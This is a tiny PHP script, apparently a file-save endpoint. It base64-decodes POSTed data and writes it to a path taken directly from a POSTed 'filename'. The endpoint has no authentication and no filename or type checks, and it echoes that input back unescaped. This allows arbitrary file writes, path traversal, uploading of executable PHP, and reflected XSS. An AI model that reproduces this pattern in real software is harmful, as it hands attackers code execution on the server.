<?php
if(!empty($_POST['data'])){
$data = base64_decode($_POST['data']);
// print_r($data);
file_put_contents( "./" . $_POST['filename'], $data );
echo $_POST['filename'] . " Saved!";
} else {
echo "No Data Sent";
}

exit();